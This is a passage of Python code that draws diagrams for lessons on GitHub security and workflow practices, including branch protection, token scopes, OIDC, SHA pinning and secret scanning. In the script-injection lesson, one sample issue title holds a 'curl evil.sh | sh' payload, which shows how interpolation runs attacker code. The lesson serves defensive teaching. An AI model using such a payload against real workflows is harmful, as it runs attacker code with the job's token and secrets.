"""GH-BP (GitHub Engineering Best Practices) diagrams: one outcome diagram per lesson.

Built from five layouts so every lesson reads the same way:
  lanes   one or more captioned rows of steps, left to right (the good lane is the hot path)
  pairs   need → answer rows (risk → control, problem → key, file → purpose)
  table   a comparison grid with a header row
  funnel  one input, a row of gates, one outcome
  stack   layered boxes, most specific at the top
Colours follow the SkillUp colour code by meaning: data sky, good green, warn saffron,
risk rose, focus indigo (one focal element per diagram), neutral slate.
"""
import functools

ACCENT = "indigo"
W = 680


def register(api):
    Diagram = functools.partial(api["Diagram"], accent=ACCENT)
    SLATE4 = api["SLATE4"]

    # ------------------------------------------------------------------ helpers
    def new(f, title, subtitle, desc):
        D = Diagram(f, 0, title, subtitle, desc)
        lines = len(f.wrap("body", subtitle, 14, W - 48)) if subtitle else 0
        return D, 62 + lines * 18 + 26

    def need(D, w, title, body=None, sub=None):
        f = D.f
        tl = f.wrap("title", title, 16, w - 24)
        sl = f.wrap("label", sub, 13, w - 24) if sub else []
        bl = f.wrap("body", body, 13, w - 24) if body else []
        return max(48, len(tl) * 18 + len(sl) * 16 + (4 + len(bl) * 16 if bl else 0) + 26)

    def cell(it):
        it = list(it) + [None] * 4
        return it[0], it[1], it[2] or "neutral", it[3]

    def caption(D, x, y, s, anchor="start"):
        # `code` captions keep their case: uppercasing a path or expression changes its meaning
        if s.startswith("`"):
            D.text(x, y, s.strip("`"), "label", 13, SLATE4, anchor)
        else:
            D.text(x, y, s.upper(), "title", 12.5, SLATE4, anchor, track=0.1)

    def finish(D, y, legend):
        if legend:
            D.legend(y + 26, legend)
            y += 26
        D.h = int(y + 22)
        return D

    def lanes(D, y, spec, gap=30):
        """spec: [(caption, [cells], hot)]; cells are (title, body, kind, sub)."""
        for cap, steps, hot in spec:
            if cap:
                caption(D, 24, y, cap); y += 14
            n = len(steps); w = (W - 48 - (n - 1) * gap) / n
            h = max(need(D, w, *cell(s)[:2], cell(s)[3]) for s in steps)
            cy = y + h / 2
            bs = []
            for i, s in enumerate(steps):
                t, b, k, sub = cell(s)
                bs.append(D.box(24 + w / 2 + i * (w + gap), cy, w, t, b, kind=k, sub=sub, h=h))
            for a, b2 in zip(bs, bs[1:]):
                D.edge([(a["r"], cy), (b2["l"], cy)], hot=hot, dashed=(hot is None))
            y += h + 26
        return y - 10

    def pairs(D, y, rows, lw=230, gap=80, heads=None, hot_kind="focus"):
        """rows: [(left cell, right cell, label)]."""
        rw = W - 48 - lw - gap
        lx, rx = 24 + lw / 2, W - 24 - rw / 2
        if heads:
            caption(D, 24, y, heads[0]); caption(D, rx - rw / 2, y, heads[1]); y += 14
        for left, right, label in rows:
            lt, lb, lk, ls = cell(left); rt, rb, rk, rs = cell(right)
            h = max(need(D, lw, lt, lb, ls), need(D, rw, rt, rb, rs))
            cy = y + h / 2
            a = D.box(lx, cy, lw, lt, lb, kind=lk, sub=ls, h=h)
            b = D.box(rx, cy, rw, rt, rb, kind=rk, sub=rs, h=h)
            D.edge([(a["r"], cy), (b["l"], cy)], hot=(rk == hot_kind),
                   label=label, at=((a["r"] + b["l"]) / 2, cy - 8) if label else None)
            y += h + 12
        return y

    def table(D, y, heads, rows, first_w=170, gap=12):
        """heads: [cells] for each column; rows: [[cells]] (first cell is the row label)."""
        n = len(heads); rest = (W - 48 - first_w - (n - 1) * gap) / (n - 1)
        ws = [first_w] + [rest] * (n - 1)
        xs, x = [], 24
        for w in ws:
            xs.append(x + w / 2); x += w + gap
        h = max(need(D, w, *cell(c)[:2]) for w, c in zip(ws, heads))
        for x, w, c in zip(xs, ws, heads):
            t, b, k, s = cell(c); D.box(x, y + h / 2, w, t, b, kind=k, sub=s, h=h)
        y += h + 10
        for r in rows:
            h = max(need(D, w, *cell(c)[:2], cell(c)[3]) for w, c in zip(ws, r))
            for x, w, c in zip(xs, ws, r):
                t, b, k, s = cell(c); D.box(x, y + h / 2, w, t, b, kind=k, sub=s, h=h)
            y += h + 10
        return y

    def funnel(D, y, top, gates, bottom, side=None, quiet=()):
        """top/bottom: cells spanning the width; gates: a row of cells; side: optional (cell, label) rejected path;
        quiet: indexes of gates that don't lead to the outcome (shown, but not blocking)."""
        tt, tb, tk, ts = cell(top)
        tw = 300 if side else W - 48
        tx = 24 + tw / 2
        th = need(D, tw, tt, tb, ts)
        a = D.box(tx, y + th / 2, tw, tt, tb, kind=tk, sub=ts, h=th)
        if side:
            (sc, label) = side
            st, sb, sk, ss = cell(sc); sw = W - 48 - tw - 90
            s = D.box(W - 24 - sw / 2, y + th / 2, sw, st, sb, kind=sk, sub=ss, h=th)
            D.edge([(a["r"], a["cy"]), (s["l"], a["cy"])], dashed=True, label=label, at=((a["r"] + s["l"]) / 2, a["cy"] - 8))
        y += th + 46
        n, gap = len(gates), 14
        gw = (W - 48 - (n - 1) * gap) / n
        gh = max(need(D, gw, *cell(g)[:2], cell(g)[3]) for g in gates)
        gs = []
        for i, g in enumerate(gates):
            t, b, k, s = cell(g)
            gs.append(D.box(24 + gw / 2 + i * (gw + gap), y + gh / 2, gw, t, b, kind=k, sub=s, h=gh))
        mid = y - 24
        for g in gs:
            D.edge([(a["cx"], a["b"]), (a["cx"], mid), (g["cx"], mid), (g["cx"], g["t"])])
        y += gh + 46
        bt, bb, bk, bs = cell(bottom)
        bh = need(D, W - 48, bt, bb, bs)
        z = D.box(W / 2, y + bh / 2, W - 48, bt, bb, kind=bk, sub=bs, h=bh)
        mid2 = y - 22
        for i, g in enumerate(gs):
            if i not in quiet:
                D.edge([(g["cx"], g["b"]), (g["cx"], mid2), (W / 2, mid2), (W / 2, z["t"])], hot=True)
        return y + bh

    def stack(D, y, layers, gap=10):
        """layers: [cells] drawn top to bottom, full width."""
        for c in layers:
            t, b, k, s = cell(c)
            h = need(D, W - 48, t, b, s)
            D.box(W / 2, y + h / 2, W - 48, t, b, kind=k, sub=s, h=h)
            y += h + gap
        return y

    # ================================================================== D1
    def d1_1(f):
        D, y = new(f, "Branch Protection: Reviewed, Tested and Current",
                   "A direct push is rejected; a pull request merges only after every required gate passes.",
                   "A direct push to main is rejected, while a pull request passes required approvals, fresh approval "
                   "after new commits, required checks and resolved conversations before it can merge.")
        y = funnel(D, y, ("Pull request", "The only way changes enter main", "data"),
                   [("Approvals", "1–2 from people with write access"),
                    ("Fresh approval", "Stale approvals dismissed; last pusher can't self-approve"),
                    ("Required checks", "Pass on an up-to-date branch"),
                    ("Conversations", "Every review thread resolved")],
                   ("Merge to main", "Force pushes and deletions stay blocked", "focus"),
                   side=(("Rejected", "Direct push with no pull request", "risk"), "direct push"))
        return finish(D, y, [("data", "input"), ("neutral", "required gate"), ("focus", "outcome"), ("risk", "blocked")])

    def d1_2(f):
        D, y = new(f, "Bypass: Who Can Skip the Rules",
                   "Classic rules exempt admins by default; a ruleset binds everyone except its named bypass list.",
                   "Classic protection lets every admin skip the rules unless no-bypass is enabled, while a ruleset binds "
                   "everyone except a named bypass list whose entries can be limited to pull requests.")
        y = table(D, y, [("Who", None, "start"), ("Classic branch protection", None, "warn"), ("Repository ruleset", None, "focus")], [
            [("Repository admins",), ("Bypass by default", "Unless 'Do not allow bypassing' is on", "warn"), ("Bound by the rules", "Unless on the bypass list", "good")],
            [("Incident team",), ("Admin or nothing", "On/off switch only", "warn"), ("Bypass list entry", "'For pull requests only' keeps a PR trail", "good")],
            [("Stolen admin token",), ("Pushes straight to main", None, "risk"), ("Blocked", "Not on the bypass list", "good")],
        ])
        return finish(D, y, [("warn", "watch"), ("good", "controlled"), ("risk", "exposed"), ("focus", "recommended")])

    def d1_3(f):
        D, y = new(f, "Rulesets Stack: the Strictest Requirement Wins",
                   "Everything that applies to a branch is combined; nothing overrides anything.",
                   "An organization ruleset requiring two approvals and a repository ruleset requiring one approval plus "
                   "code owner review combine into two approvals and code owner review.")
        y = funnel(D, y, ("Pull request to main", None, "data"),
                   [("Organization ruleset", "Requires 2 approvals", None, "tier=production"),
                    ("Repository ruleset", "Requires 1 approval + code owner review"),
                    ("Classic rule (optional)", "Layers in too, if one exists")],
                   ("Combined: 2 approvals and code owner review", "Most restrictive version of each rule; no priority order", "focus"))
        return finish(D, y, [("data", "input"), ("neutral", "rules that apply"), ("focus", "what GitHub enforces")])

    def d1_4(f):
        D, y = new(f, "CODEOWNERS: Last Match Wins, Then the Gate",
                   "Ownership routes the review; 'Require review from Code Owners' makes it mandatory.",
                   "A pull request touching migrations and payments files is matched against CODEOWNERS from top to "
                   "bottom, the last matching line names the owner, and the merge waits for that owner only when code "
                   "owner review is required.")
        y = lanes(D, y, [
            ("Matching (base branch's CODEOWNERS)", [("PR touches /migrations/", None, "data"),
                                                     ("Read lines top to bottom", "* @team-lead first, specifics later"),
                                                     ("Last match wins", "@dba-team is the owner", "focus")], True),
            ("With 'Require review from Code Owners'", [("@dba-team requested", "Automatically"),
                                                        ("Merge waits", "Until a DBA approves", "good")], True),
            ("Without it", [("@dba-team requested", "Automatically"),
                            ("Any approval merges", "Owners can be ignored", "warn")], None),
        ])
        return finish(D, y, [("data", "input"), ("focus", "owner found"), ("good", "gate"), ("warn", "routing only")])

    def d1_5(f):
        D, y = new(f, "Merge Gates: Required Means Blocking",
                   "Only checks marked required, a required deployment and the merge queue can hold a merge.",
                   "Merge is allowed only when required checks pass on an up-to-date branch and the required staging "
                   "deployment succeeded; optional checks are shown but never block, and auto-merge waits for the same gates.")
        y = funnel(D, y, ("Pull request with auto-merge on", "Merges itself once every gate passes, bypassing none", "data"),
                   [("Required checks", "build, test, security-scan"),
                    ("Up to date", "Strict mode, or a merge queue with merge_group"),
                    ("Staging deployed", "Require deployments to succeed"),
                    ("Optional checks", "Shown, never block", "warn")],
                   ("Merge to main", None, "focus"), quiet=(3,))
        return finish(D, y, [("data", "input"), ("neutral", "blocking gate"), ("warn", "advice only"), ("focus", "outcome")])

    def d1_6(f):
        D, y = new(f, "Required Workflow vs Required Status Check",
                   "A status check trusts the repo's own workflow; a ruleset runs the central file itself.",
                   "A team edits its own copy of a dependency-review workflow to always pass, so its required check goes "
                   "green, while a ruleset-required workflow runs from the central repository and still blocks the "
                   "vulnerable pull request.")
        y = lanes(D, y, [
            ("Required status check", [("Workflow in the team's repo", None, "data"),
                                       ("Team adds continue-on-error", None, "warn"),
                                       ("Check passes anyway", "Vulnerable PR merges", "risk")], None),
            ("Organization ruleset: require workflows to pass", [("Workflow in a central repo", None, "data"),
                                                                 ("GitHub runs that file", "Filters like paths: ignored", "focus"),
                                                                 ("Vulnerable PR blocked", "Teams can't edit the gate", "good")], True),
        ])
        return finish(D, y, [("data", "source"), ("warn", "false fix"), ("risk", "risk"), ("focus", "the gate"), ("good", "outcome")])

    def d1_7(f):
        D, y = new(f, "Branching Strategies and Merge Methods",
                   "The shorter a branch lives, the cheaper review, CI and merging stay.",
                   "Trunk-based development with hour-long branches, GitHub flow with days-long branches and GitFlow with "
                   "weeks-long release branches are compared by branch lifetime and release style, alongside the merge, "
                   "squash and rebase merge methods.")
        y = table(D, y, [("Strategy", None, "start"), ("Branch lifetime", None, "start"), ("Releases", None, "start"), ("Best fit", None, "start")], [
            [("Trunk-based", None, "focus"), ("Hours to a day",), ("Continuous, feature flags",), ("Many deploys a day",)],
            [("GitHub flow",), ("Days",), ("Deploy from main",), ("Most SaaS teams",)],
            [("GitFlow",), ("Weeks", "develop and release/*", "warn"), ("Scheduled, versioned",), ("Supported old versions",)],
        ], first_w=150)
        y = lanes(D, y + 6, [("Merge methods", [("Merge commit", "Keeps every commit + a merge"),
                                                ("Squash", "One commit per PR", "good"),
                                                ("Rebase", "Commits replayed linearly")], False)])
        return finish(D, y, [("focus", "fastest feedback"), ("warn", "long-lived"), ("good", "clean history")])

    def d1_8(f):
        D, y = new(f, "Branch Names: Reject Early or Reject Late",
                   "A ruleset rejects a bad name at push; a required check catches it at merge.",
                   "A push of a branch named Release-2.4 is rejected by a ruleset branch-name rule at push time, while a "
                   "required check catches the same name later, at merge time.")
        y = lanes(D, y, [
            ("Ruleset: restrict branch names (at push)", [("git push Release-2.4", None, "data"),
                                                         ("Pattern check", "feature|fix|hotfix|release/…", "focus"),
                                                         ("Push rejected", "The branch never exists", "good")], True),
            ("Required naming check (at merge)", [("Branch pushed", None, "data"),
                                                  ("PR check on head_ref", "Name passed via env:"),
                                                  ("Merge blocked", "Branch already exists", "warn")], False),
            ("Classic protection pattern", [("release/* rule", None, "data"),
                                            ("Release-2.4 doesn't match", "Not validated, not protected", "risk")], None),
        ])
        return finish(D, y, [("focus", "the rule"), ("good", "stopped at push"), ("warn", "stopped at merge"), ("risk", "missed")])

    def d1_9(f):
        D, y = new(f, "Branch Lifecycle: Delete, Lock, Protect, Archive",
                   "Match the tool to what must happen to the branch, tag or repository.",
                   "Merged feature branches are deleted automatically, end-of-life release branches are locked read-only, "
                   "release tags are protected by a tag ruleset, and a whole retired repository is archived instead.")
        y = pairs(D, y, [
            (("Merged feature branch", None, "data"), ("Automatically delete head branches", "Gone the moment the PR merges", "good"), None),
            (("End-of-life v1.x branch", None, "data"), ("Lock branch", "Read-only; can still allow fork syncing", "good"), None),
            (("Release tag v2.3.0", None, "data"), ("Tag ruleset on refs/tags/v*", "Restrict updates and deletions; release app bypasses", "focus"), None),
            (("Retired repository", None, "data"), ("Archive", "Everything read-only, issues and PRs too", "neutral"), None),
        ], heads=("What you have", "What to do"))
        return finish(D, y, [("data", "situation"), ("good", "tidy"), ("focus", "immutable releases"), ("neutral", "whole repo")])

    def d1_10(f):
        D, y = new(f, "Branch Risk Matrix",
                   "Each risk has its own control; signing proves who, review proves what.",
                   "Each branch risk maps to its control: direct pushes to a required pull request, unreviewed merges to "
                   "approvals and code owners, rewritten history to blocked force pushes, moved tags to a tag ruleset, "
                   "and forged authorship to required signed commits.")
        y = pairs(D, y, [
            (("Direct push breaks production", None, "risk", "critical"), ("Require a pull request + checks",), None),
            (("Merge without the right review", None, "risk", "high"), ("Approvals + code owner review",), None),
            (("History rewritten", None, "risk", "high"), ("Force pushes and deletions blocked",), None),
            (("Release tag moved", None, "risk", "high"), ("Tag ruleset",), None),
            (("Commit forged as a colleague", None, "risk", "high"), ("Require signed commits", "Verified GPG, SSH or S/MIME", "focus"), None),
        ], heads=("Risk", "Control"))
        return finish(D, y, [("risk", "risk"), ("neutral", "control"), ("focus", "this lesson")])

    # ================================================================== D2
    def d2_1(f):
        D, y = new(f, "GITHUB_TOKEN: Least Privilege per Job",
                   "Default to contents: read and grant each job only the scope it needs.",
                   "A workflow defaults to contents read, the test job keeps that, the comment job adds pull-requests "
                   "write and the release job adds contents write, while fork pull requests are downgraded to read-only "
                   "with no secrets.")
        y = funnel(D, y, ("Workflow default: permissions: contents: read", "Repository or org default set to restricted", "focus"),
                   [("test job", "contents: read"),
                    ("comment job", "+ pull-requests: write"),
                    ("release job", "+ contents: write, id-token: write")],
                   ("Each token expires when its job ends", "Listing any scope sets every unlisted scope to none", "good"),
                   side=(("Fork pull_request runs", "Read-only token, no secrets", "warn"), "forks"))
        return finish(D, y, [("focus", "default"), ("neutral", "per-job grant"), ("warn", "downgraded"), ("good", "outcome")])

    def d2_2(f):
        D, y = new(f, "Secrets and Variables: the Most Specific Scope Wins",
                   "Environment beats repository beats organization; non-sensitive values are variables.",
                   "Organization, repository and environment secrets are stacked with the environment level winning name "
                   "collisions, environment secrets unlock only after reviewer approval, and non-sensitive values live in "
                   "variables.")
        y = stack(D, y, [
            ("Environment secret", "Wins name collisions. Only jobs that declare the environment, after its reviewers approve.", "focus", "most specific"),
            ("Repository secret", "Every workflow in the repository can read it.", "neutral"),
            ("Organization secret", "All or selected repositories share it.", "neutral", "least specific"),
            ("Variables (vars)", "Hostnames, regions, flags: not sensitive, shown in logs.", "data"),
        ])
        return finish(D, y - 10, [("focus", "wins and is gated"), ("neutral", "secret"), ("data", "configuration")])

    def d2_3(f):
        D, y = new(f, "OIDC: Short-Lived Cloud Credentials per Job",
                   "No stored key: the cloud trusts a signed token only when its claims match.",
                   "A deploy job requests a JWT from GitHub's OIDC provider, the cloud checks the audience and the subject "
                   "claim against the role's trust policy, and only a matching job receives short-lived credentials.")
        y = lanes(D, y, [
            ("Matching job", [("Deploy job", "id-token: write, environment: production", "data"),
                              ("Signed JWT", "Claims: repo, ref, environment"),
                              ("Trust policy", "Checks aud and the environment in sub", "focus"),
                              ("Short-lived credentials", "Valid for this job only", "good")], True),
            ("Any other workflow", [("Other repo or branch", None, "data"),
                                    ("Signed JWT", "Different sub"),
                                    ("Trust policy", "sub doesn't match"),
                                    ("Rejected", "No credentials", "risk")], None),
        ])
        return finish(D, y, [("data", "requester"), ("focus", "the check"), ("good", "granted"), ("risk", "rejected")])

    def d2_4(f):
        D, y = new(f, "Pin Actions to a Full SHA",
                   "A tag can be moved to new code; a commit SHA can't.",
                   "An action referenced by tag runs whatever the tag points to after a maintainer is compromised, while "
                   "an action pinned to a full SHA keeps running the reviewed commit and Dependabot proposes updates as "
                   "reviewable pull requests.")
        y = lanes(D, y, [
            ("`uses: org/action@v2`", [("Maintainer compromised", None, "data"),
                                     ("Tag v2 moved", "No change in your repo", "warn"),
                                     ("Next run executes it", "With your token and secrets", "risk")], None),
            ("`uses: org/action@<full SHA>  # v2.1.0`", [("Maintainer compromised", None, "data"),
                                                       ("Your SHA can't move", None, "focus"),
                                                       ("Reviewed code keeps running", "Dependabot proposes bumps as PRs", "good")], True),
        ])
        return finish(D, y, [("warn", "silent change"), ("risk", "risk"), ("focus", "pinned"), ("good", "outcome")])

    def d2_5(f):
        D, y = new(f, "Script Injection: Data, Not Code",
                   "${{ }} is pasted into the script before the shell runs; env: keeps input as data.",
                   "An issue title interpolated into run becomes part of the shell command and executes, while the same "
                   "title passed through an environment variable arrives as plain data.")
        y = lanes(D, y, [
            ("`run: echo \"${{ github.event.issue.title }}\"`", [("Title: \"; curl evil.sh | sh; \"", None, "data"),
                                                              ("Pasted into the script", "Before bash runs", "warn"),
                                                              ("Attacker's command runs", "With the job's token", "risk")], None),
            ("`env: TITLE: ${{ github.event.issue.title }}`", [("Same title", None, "data"),
                                                             ("Set as $TITLE", "Quoted in the shell", "focus"),
                                                             ("Printed as text", "Nothing executes", "good")], True),
        ])
        return finish(D, y, [("data", "untrusted input"), ("risk", "executes"), ("focus", "the fix"), ("good", "outcome")])

    def d2_6(f):
        D, y = new(f, "Runners: Who Can Run Code, and What It Can Reach",
                   "Persistent self-hosted runners plus public repositories is the combination to avoid.",
                   "A public repository's fork pull request reaches a persistent self-hosted runner that keeps state and "
                   "sits inside the network, while ephemeral runners in a restricted group serve only private "
                   "repositories and are destroyed after each job.")
        y = lanes(D, y, [
            ("Public repo + persistent self-hosted runner", [("Fork pull request", "Anyone on the internet", "data"),
                                                            ("Persistent runner", "Keeps state, inside your network", "warn"),
                                                            ("Next job is exposed", "Toolcache and credentials", "risk")], None),
            ("Private repos + ephemeral runners", [("Private repo job", "Restricted runner group", "data"),
                                                   ("Just-in-time runner", "One job, GPU if needed", "focus"),
                                                   ("Destroyed after the job", "Nothing carries over", "good")], True),
            ("GitHub-hosted runners", [("Any repository", None, "data"),
                                       ("Fresh VM per job", "Discarded afterwards", "good")], True),
        ])
        return finish(D, y, [("data", "who triggers"), ("warn", "persistent"), ("risk", "risk"), ("focus", "recommended"), ("good", "isolated")])

    def d2_7(f):
        D, y = new(f, "Dependabot: Alerts, Security Updates, Version Updates",
                   "Three triggers; only version updates need dependabot.yml.",
                   "A dependency graph feeds Dependabot alerts, alerts lead to security update pull requests with no "
                   "config file, and dependabot.yml schedules version update pull requests, including the github-actions "
                   "ecosystem.")
        y = lanes(D, y, [
            ("When a dependency is vulnerable", [("Dependency graph", None, "data"),
                                                 ("Dependabot alert", "Known advisory"),
                                                 ("Security update PR", "Minimum patched version, no config file", "good")], True),
            ("On a schedule", [(".github/dependabot.yml", "npm, docker, github-actions", "data"),
                               ("Version update PRs", "Grouped, e.g. all patch bumps", "focus"),
                               ("Your auto-merge workflow", "Optional; Dependabot never merges itself", "warn")], True),
        ])
        return finish(D, y, [("data", "source"), ("good", "fix"), ("focus", "stay current"), ("warn", "you build it")])

    def d2_8(f):
        D, y = new(f, "Cache Scope: Down, Never Sideways",
                   "A run restores its own branch's cache, the default branch's, and for PRs the base branch's.",
                   "A feature branch can restore caches from itself and the default branch, and a pull request also from "
                   "its base branch, but nothing flows from a sibling branch or back up to main.")
        m = D.box(W / 2, y + 30, 300, "main (default branch)", "Its cache is readable by every branch", kind="focus", h=60)
        y2 = y + 150
        a = D.box(150, y2, 230, "feature/a", "Own cache + main's", kind="good", h=60)
        b = D.box(530, y2, 230, "feature/b", "Own cache + main's", kind="good", h=60)
        D.edge([(W / 2 - 60, m["b"]), (W / 2 - 60, y + 100), (150, y + 100), (150, a["t"])], hot=True, label="restore", at=(220, y + 94))
        D.edge([(W / 2 + 60, m["b"]), (W / 2 + 60, y + 100), (530, y + 100), (530, b["t"])], hot=True, label="restore", at=(460, y + 94))
        D.edge([(a["r"], y2), (b["l"], y2)], dashed=True, label="never sideways", at=(W / 2, y2 - 8))
        y3 = y2 + 116
        p = D.box(150, y3, 230, "PR into feature/a", "Also its base branch's cache", kind="data", h=60)
        D.edge([(150, a["b"]), (150, p["t"])], hot=True)
        r = D.box(530, y3, 230, "Key", "runner.os + hashFiles(lockfile)", kind="neutral", sub="changes when deps change", h=60)
        return finish(D, y3 + 40, [("focus", "default branch"), ("good", "feature branch"), ("data", "pull request"), ("dashed", "not allowed")])

    def d2_9(f):
        D, y = new(f, "Code Scanning: From Alert to Gate",
                   "Findings only block a merge when a rule or required check says so.",
                   "CodeQL or a third-party tool's SARIF upload produces alerts on the pull request, and only a ruleset's "
                   "code scanning rule or a required check turns those alerts into a blocked merge.")
        y = lanes(D, y, [
            ("Analysis", [("CodeQL", "Default or advanced setup", "data"),
                          ("Third-party SAST", "upload-sarif, security-events: write", "data"),
                          ("Alerts on the PR", "Security tab + annotations")], False),
            ("Without a gate", [("High-severity alert", None, "warn"),
                                ("PR merges anyway", "A report, not a gate", "risk")], None),
            ("With a gate", [("Ruleset: require code scanning results", "Or a required check", "focus"),
                             ("Merge blocked", "Until the alert is fixed", "good")], True),
        ])
        return finish(D, y, [("data", "scanner"), ("risk", "merged anyway"), ("focus", "the gate"), ("good", "blocked")])

    def d2_10(f):
        D, y = new(f, "Reuse: Jobs, Steps or a Copy",
                   "Reusable workflows replace jobs, composite actions replace steps, templates are copied once.",
                   "A reusable workflow is called at job level and runs as its own job on its own runner, a composite "
                   "action is called at step level and runs inline in the caller's job, and a workflow template is "
                   "copied once and then diverges.")
        y = table(D, y, [("Compare", None, "start"), ("Reusable workflow", "on: workflow_call", "focus"), ("Composite action", "runs.using: composite", "data"), ("Workflow template", None, "warn")], [
            [("Used at",), ("Job level", "jobs.<id>.uses"), ("Step level", "steps[*].uses"), ("Repo creation",)],
            [("Runs",), ("Own job and runner",), ("Inline, caller's runner",), ("It's a copy",)],
            [("A fix propagates?",), ("Yes", None, "good"), ("Yes", None, "good"), ("No, copies diverge", None, "risk")],
        ], first_w=130)
        return finish(D, y, [("focus", "whole stage"), ("data", "a few steps"), ("good", "propagates"), ("risk", "diverges")])

    def d2_11(f):
        D, y = new(f, "Environments: the Deploy Waits at the Gate",
                   "Rules and secrets apply only to jobs that declare environment: production.",
                   "A merged change deploys to staging automatically, then the production job waits for an approved "
                   "reviewer, the wait timer and a main-only branch rule before production secrets unlock and the deploy "
                   "runs.")
        y = funnel(D, y, ("deploy-production job", "environment: production (staging deployed automatically before it)", "data"),
                   [("Required reviewer", "@team-leads; self-review blocked"),
                    ("Wait timer", "5 minutes"),
                    ("Branch rule", "main only")],
                   ("Production secrets unlock, deploy runs", None, "focus"),
                   side=(("Job without environment:", "Skips every rule; can't read its secrets", "risk"), "not declared"))
        return finish(D, y, [("data", "deploy job"), ("neutral", "protection rule"), ("focus", "outcome"), ("risk", "ungated")])

    def d2_12(f):
        D, y = new(f, "Workflow Control: a Built-in Key for Each Problem",
                   "Reach for the native key before writing glue code.",
                   "Four built-in keys solve four problems: concurrency queues or cancels overlapping runs, timeout-minutes "
                   "ends hung jobs, a matrix fans one job across operating systems and versions, and outputs pass values "
                   "to dependent jobs.")
        y = pairs(D, y, [
            (("Overlapping runs race", None, "warn"), ("concurrency", "Queue deploys; cancel-in-progress for PR CI", "focus"), None),
            (("A hung job holds a runner", None, "warn"), ("timeout-minutes", "Job or step level (default 360); none at workflow level"), None),
            (("Same job on every OS and version", None, "warn"), ("strategy.matrix", "One definition fans out; max-parallel limits it"), None),
            (("A later job needs a value", None, "warn"), ("outputs + needs", "Set via $GITHUB_OUTPUT; jobs don't share a workspace"), None),
            (("Only deploy should be limited", None, "warn"), ("Job-level if:", "A trigger filter would stop every job"), None),
        ], heads=("Problem", "Built-in key"))
        return finish(D, y, [("warn", "problem"), ("neutral", "native key")])

    # ================================================================== D3
    def d3_1(f):
        D, y = new(f, "Repository Essentials",
                   "Each file answers a question a contributor, lawyer or attacker would ask.",
                   "A repository's root and .github folder hold the README, LICENSE, .gitignore, CONTRIBUTING, SECURITY, "
                   "CODEOWNERS and dependabot.yml, grouped by what each one protects: people, legal terms, secrets, "
                   "reviews and dependencies.")
        y = pairs(D, y, [
            (("README.md, CONTRIBUTING.md", None, "data"), ("People", "What it is, how to run it, how to contribute"), None),
            (("LICENSE", None, "data"), ("Legal terms", "How others may use and change it"), None),
            ((".gitignore", None, "data"), ("Secrets", "Keeps .env, keys and build output out of commits", "focus"), None),
            (("SECURITY.md", None, "data"), ("Disclosure", "How to report vulnerabilities privately"), None),
            (("CODEOWNERS, dependabot.yml", None, "data"), ("Reviews and dependencies", "Who reviews what; scheduled updates"), None),
        ], heads=("File", "What it protects"))
        return finish(D, y, [("data", "file"), ("focus", "first line of defence"), ("neutral", "purpose")])

    def d3_2(f):
        D, y = new(f, "Push Protection Stops It; Secret Scanning Finds It",
                   "Block at push, alert on history, and when something leaks: rotate first.",
                   "A push containing a secret is stopped by push protection before it reaches the repository, a secret "
                   "already in history is found by secret scanning, and the remediation order is rotate first, check "
                   "logs, then optionally rewrite history.")
        y = lanes(D, y, [
            ("At push", [("git push with an AWS key", None, "data"),
                         ("Push protection", "Command line, web UI, uploads, API", "focus"),
                         ("Push rejected", "Bypass needs a reason, or a reviewer with delegated bypass", "good")], True),
            ("Already in history", [("Old commit with a key", None, "data"),
                                    ("Secret scanning", "History, issues, PRs, discussions"),
                                    ("Alert raised", None, "warn")], False),
            ("Remediation order", [("1. Revoke and rotate", "This is the fix", "good"),
                                   ("2. Check provider logs",),
                                   ("3. Optional rewrite", "git-filter-repo + GitHub Support", "warn")], True),
        ])
        return finish(D, y, [("data", "secret"), ("focus", "blocks"), ("warn", "after the fact"), ("good", "fix")])

    def d3_3(f):
        D, y = new(f, "Two Products, One Enforced Baseline",
                   "Buy what you need, then enforce it across a class of repositories.",
                   "Secret Protection groups secret scanning, push protection and custom patterns, Code Security groups "
                   "code scanning, Autofix and dependency review, and an enforced security configuration applies the "
                   "chosen features to a class of repositories.")
        top = y
        a = D.box(178, top + 60, 300, "GitHub Secret Protection", "Secret scanning, push protection, AI-detected secrets, custom patterns, delegated bypass", kind="data", h=104)
        b = D.box(502, top + 60, 300, "GitHub Code Security", "Code scanning, Copilot Autofix, dependency review, security campaigns", kind="data", h=104)
        y = top + 160
        c = D.box(W / 2, y + 40, W - 48, "Custom security configuration, Enforce on",
                  "Applied to repositories with tier=critical or tier=standard; owners can't turn features off", kind="focus", h=80)
        D.edge([(178, a["b"]), (178, c["t"])], hot=True)
        D.edge([(502, b["b"]), (502, c["t"])], hot=True)
        y += 120
        d = D.box(W / 2, y + 28, W - 48, "Security overview", "Reports coverage and alerts; it doesn't enforce anything", kind="neutral", h=56)
        D.edge([(W / 2, c["b"]), (W / 2, d["t"])])
        return finish(D, y + 56, [("data", "product"), ("focus", "enforcement"), ("neutral", "reporting")])

    def d3_4(f):
        D, y = new(f, "Dependency Review: Customs at the Border",
                   "A required check stops new risk at the pull request; alerts watch what's already merged.",
                   "A pull request's dependency changes are checked against the advisory database and the license allow "
                   "list, and a required dependency review check blocks the merge on a high-severity vulnerability or a "
                   "disallowed license.")
        y = funnel(D, y, ("Pull request adds or updates dependencies", None, "data"),
                   [("Advisory database", "fail-on-severity: high"),
                    ("License list", "allow-licenses or deny-licenses (SPDX)"),
                    ("Scope", "fail-on-scopes: runtime, development")],
                   ("Required check fails: merge blocked", "Make it ruleset-required so teams can't weaken it", "focus"),
                   side=(("Dependabot alerts", "Watch merged code, don't block PRs", "warn"), "after merge"))
        return finish(D, y, [("data", "pull request"), ("neutral", "check"), ("focus", "gate"), ("warn", "reports only")])

    def d3_5(f):
        D, y = new(f, "Templates Ask the Questions Up Front",
                   "Forms can require answers; Markdown templates can only suggest them.",
                   "A bug report opened through an issue form must fill required fields before it can be submitted, a PR "
                   "template prompts for what, why and how it was tested, and config.yml turns off blank issues and sends "
                   "security reports to private reporting.")
        y = lanes(D, y, [
            ("`Issue form: .github/ISSUE_TEMPLATE/bug.yml`", [("Bug report", None, "data"),
                                                            ("Required fields", "Version, steps to reproduce", "focus"),
                                                            ("Submittable once complete", None, "good")], True),
            ("`PR template: .github/pull_request_template.md`", [("New pull request", None, "data"),
                                                                ("Pre-filled prompts", "What, why, how tested, checklist"),
                                                                ("Can be deleted by the author", None, "warn")], False),
            ("`.github/ISSUE_TEMPLATE/config.yml`", [("New issue", None, "data"),
                            ("Blank issues off", "Security link to private reporting", "good")], True),
        ])
        return finish(D, y, [("data", "author starts"), ("focus", "enforced"), ("good", "outcome"), ("warn", "suggestion only")])

    def d3_6(f):
        D, y = new(f, "Private Vulnerability Reporting",
                   "The report, the fix and the advisory stay private until the patch ships.",
